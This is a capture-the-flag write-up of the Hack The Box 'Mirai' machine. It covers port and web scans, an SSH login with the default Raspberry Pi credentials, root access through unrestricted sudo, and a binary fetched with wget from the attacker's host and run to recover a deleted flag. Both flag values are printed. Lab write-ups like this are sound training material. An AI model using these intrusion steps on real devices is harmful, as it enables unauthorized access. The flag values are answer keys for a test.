# Writeup

## Recon

- For basic recon, I always start with nmapAutomator and rustscan. This allows for fast port scans and automated background recon.  

### nmapAutomator

```
┌──(kali㉿kali)-[~/HTB/machines/mirai]
└─$ sudo nmapAutomator.sh -t Recon -H 10.10.10.48
```

```
PORT   STATE SERVICE VERSION                                                                                          
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)                                                     
| ssh-hostkey:                                                                                                        
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)                                                        
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
53/tcp open  domain  dnsmasq 2.76                          
| dns-nsid:                                                                                                           
|_  bind.version: dnsmasq-2.76                                                                                        
80/tcp open  http    lighttpd 1.4.35                       
|_http-server-header: lighttpd/1.4.35                      
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).                                                   
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
                                                        
```

```
- Nikto v2.1.6                                                                                                        
---------------------------------------------------------------------------                                           
+ Target IP:          10.10.10.48                                                                                     
+ Target Hostname:    10.10.10.48                                                                                     
+ Target Port:        80                                                                                              
+ Start Time:         2021-08-12 15:04:29 (GMT-4)                                                                     
---------------------------------------------------------------------------                                           
+ Server: lighttpd/1.4.35                                                                                             
+ The anti-clickjacking X-Frame-Options header is not present.                                                                                                                                                                              
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-pi-hole' found, with contents: A black hole for Internet advertisements.
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ 7862 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2021-08-12 15:41:07 (GMT-4) (2198 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested   
```

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET                                 
 :: URL              : http://10.10.10.48:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false                               
 :: Calibration      : false                               
 :: Timeout          : 10                                  
 :: Threads          : 40                                  
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

admin                   [Status: 301, Size: 0, Words: 1, Lines: 1]
swfobject.js            [Status: 200, Size: 61, Words: 10, Lines: 2]
:: Progress: [4614/4614] :: Job [1/1] :: 277 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
```

### rustscan 

```
┌──(kali㉿kali)-[~/HTB/machines/mirai]
└─$ sudo rustscan -a 10.10.10.48 | tee rustscan.txt
```

```
[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.48:22
Open 10.10.10.48:53
Open 10.10.10.48:80
Open 10.10.10.48:1268
Open 10.10.10.48:32400
Open 10.10.10.48:32469
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 15:04 EDT
Initiating Ping Scan at 15:04
Scanning 10.10.10.48 [4 ports]
Completed Ping Scan at 15:04, 0.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:04
Completed Parallel DNS resolution of 1 host. at 15:04, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:04
Scanning 10.10.10.48 [6 ports]
Discovered open port 53/tcp on 10.10.10.48
Discovered open port 80/tcp on 10.10.10.48
Discovered open port 22/tcp on 10.10.10.48
Discovered open port 32469/tcp on 10.10.10.48
Discovered open port 1268/tcp on 10.10.10.48
Discovered open port 32400/tcp on 10.10.10.48
Completed SYN Stealth Scan at 15:04, 0.18s elapsed (6 total ports)
Nmap scan report for 10.10.10.48
Host is up, received echo-reply ttl 63 (0.14s latency).
Scanned at 2021-08-12 15:04:34 EDT for 1s

PORT      STATE SERVICE       REASON
22/tcp    open  ssh           syn-ack ttl 63
53/tcp    open  domain        syn-ack ttl 63
80/tcp    open  http          syn-ack ttl 63
1268/tcp  open  propel-msgsys syn-ack ttl 63
32400/tcp open  plex          syn-ack ttl 63
32469/tcp open  unknown       syn-ack ttl 63

```

### Manual recon scans

- After the automated scans reveal ports and possible webpages, I like to run manual scans in parallel for more specific ports and fuzzing the http webserver.

```
┌──(kali㉿kali)-[~/HTB/machines/mirai]
└─$ nmap --script vuln -Pn 10.10.10.48 -p 22,53,80,1268,32400,32469 | tee nmap-vuln.txt

Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 15:37 EDT
Nmap scan report for 10.10.10.48
Host is up (0.13s latency).

PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
80/tcp    open  http
| http-cookie-flags: 
|   /admin/: 
|     PHPSESSID: 
|       httponly flag not set
|   /admin/index.php: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.php: Possible admin folder
|   /javascript/sorttable.js: Secunia NSI
|   /en/welcomeRes.js: VMWare
|   /Citrix//AccessPlatform/auth/clientscripts/cookies.js: Citrix
|   /Citrix/AccessPlatform/auth/clientscripts/login.js: Citrix
|   /wp-includes/js/scriptaculous/sound.js: Wordpress version 2.3 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|_  /wp-includes/js/codepress/codepress.js: Wordpress version 2.8 found.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
1268/tcp  open  propel-msgsys
32400/tcp open  plex
|_sslv2-drown: 
32469/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 105.60 seconds
```


```
┌──(kali㉿kali)-[~/HTB/machines/mirai]
└─$ ffuf -w /usr/share/dirb/wordlists/big.txt -u http://10.10.10.48/FUZZ | tee ffuf-dirb-big.txt     

admin                   [Status: 301, Size: 0, Words: 1, Lines: 1]
versions                [Status: 200, Size: 13, Words: 1, Lines: 1]
```

```
┌──(kali㉿kali)-[~/HTB/machines/mirai]
└─$ nmap -sV -Pn 10.10.10.48 -p 22,53,80,1268,32400,32469 | tee nmap-sv.txt  

Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-12 15:38 EDT
Nmap scan report for 10.10.10.48
Host is up (0.14s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
53/tcp    open  domain  dnsmasq 2.76
80/tcp    open  http    lighttpd 1.4.35
1268/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp open  http    Plex Media Server httpd
32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.71 seconds
```

## Web enumeration

- After initial recon, I visited the `/admin` path on the port 80 webserver to find a Pi-Hole instance. As expected, port 32400 holds a Plex Media Server instance. 

![[a9b4fcf9599747fb26cc0238f892b38d-1.png]]

![[3d8b204cecf79f30dcca1989d56c07aa-1.png]]

![[506296bc308963749151b8a8323abe17-1.png]]

## Initial Access

### Default credentials on Raspberry Pi

- From experience, I know that this setup is similar to a Raspberry Pi hobbyist messing around with different services (I've been there...). So, out of audacity and curiosity, I decided to SSH into the machine with the default credentials `pi:raspberrypi`

```
┌──(kali㉿kali)-[~/HTB/machines/mirai]
└─$ ssh pi@10.10.10.48                             
The authenticity of host '10.10.10.48 (10.10.10.48)' can't be established.
ECDSA key fingerprint is SHA256:UkDz3Z1kWt2O5g2GRlullQ3UY/cVIx/oXtiqLPXiXMY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.48' (ECDSA) to the list of known hosts.
pi@10.10.10.48's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $ ls
background.jpg  Documents  Music         Pictures  python_games  Videos
Desktop         Downloads  oldconffiles  Public    Templates
```

- Looks like this Raspberry Pi owner is as lazy as I am!

## Privesc

### Absurd sudo permissions

- At this point, I decided to check if, out of laziness, the owner allowed excessive sudo permissions to the `pi` user (meaning I could assume identity as `root` directly). Let's just say that I was right again...except this time, the `root.txt` flag wasn't so nice to me.

```
pi@raspberrypi:~ $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
pi@raspberrypi:~ $ sudo su
root@raspberrypi:/home/pi# ls
background.jpg  Documents  Music         Pictures  python_games  Videos
Desktop         Downloads  oldconffiles  Public    Templates
root@raspberrypi:/home/pi# cat Desktop/user.txt
ff837707441b257a20e32199d7c8838d
root@raspberrypi:/home/pi# cat /root/root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
root@raspberrypi:/home/pi# 
```

### The hunt for root.txt

- Since the usb stick could be mounted somewhere already, I decided to list the mounts and look for "usb" somewhere. But again I was greeted with an unpleasant surprise. 

```
root@raspberrypi:~# mount -l | grep usb
/dev/sdb on /media/usbstick type ext4 (ro,nosuid,nodev,noexec,relatime,data=ordered)
root@raspberrypi:~# cd /media/usbstick
root@raspberrypi:/media/usbstick# ls
damnit.txt  lost+found
root@raspberrypi:/media/usbstick# cat damnit.txt 
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
root@raspberrypi:/media/usbstick# 
```

- Looking on Google for "undeleting files on ext4" (ext4 being the filesystem of the usbstick), a tool called `extundelete` came up multiple times, but I needed the executable binary and the architecture of the raspberry pi to make sure it was compatible.

```
root@raspberrypi:/home/pi/restore# uname -a
Linux raspberrypi 3.16.0-4-686-pae #1 SMP Debian 3.16.36-1+deb8u2 (2016-10-19) i686 GNU/Linux
```
- A quick Google search reveals that i686 is just 32-bit architecture.
- Eventually I found a compatible `extundelete` 32-bit binary on https://dwaves.de/2014/05/01/ext3undelete-ext4undelete-extundelete-linux-undelete-recover-deleted-files-extundelete-bad-magic-number-in-super-block-when-trying-to-open-filesystem-do-not-attach-external-usb-sata-harddisk-direc/
- After downloading the binary on Kali, I transferred it using a Python HTTP server on Kali and used chmod to make it executable.

```
root@raspberrypi:/home/pi/Downloads# wget http://10.10.14.3:8000/extundelete
--2021-08-12 23:47:54--  http://10.10.14.3:8000/extundelete
Connecting to 10.10.14.3:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 901458 (880K) [application/octet-stream]
Saving to: ‘extundelete’

extundelete                                                100%[==========================================================================================================================================>] 880.33K   117KB/s   in 7.0s   

2021-08-12 23:48:01 (126 KB/s) - ‘extundelete’ saved [901458/901458]
root@raspberrypi:/home/pi/Downloads# chmod +x extundelete
```

- Before using the utility, I unmounted the usb stick just to be safe, then restored all files that were deleted from the root directory of the usb stick.

```
root@raspberrypi:/home/pi/Downloads# umount /media/usbstick/
root@raspberrypi:/home/pi/Downloads# ./extundelete --restore-directory / -o restore /dev/sdb
NOTICE: Extended attributes are not restored.
Loading filesystem metadata ... 2 groups loaded.
Loading journal descriptors ... 23 descriptors loaded.
Searching for recoverable inodes in directory // ... 
1 recoverable inodes found.
Looking through the directory structure for deleted files ... 
0 recoverable inodes still lost.
```

- Root flag done!

```
root@raspberrypi:/home/pi/Downloads# ls
extundelete  restore
root@raspberrypi:/home/pi/Downloads# cd restore 
root@raspberrypi:/home/pi/Downloads/restore# ls
root.txt
root@raspberrypi:/home/pi/Downloads/restore# cat root.txt
3d3e483143ff12ec505d026fa13e020b
```
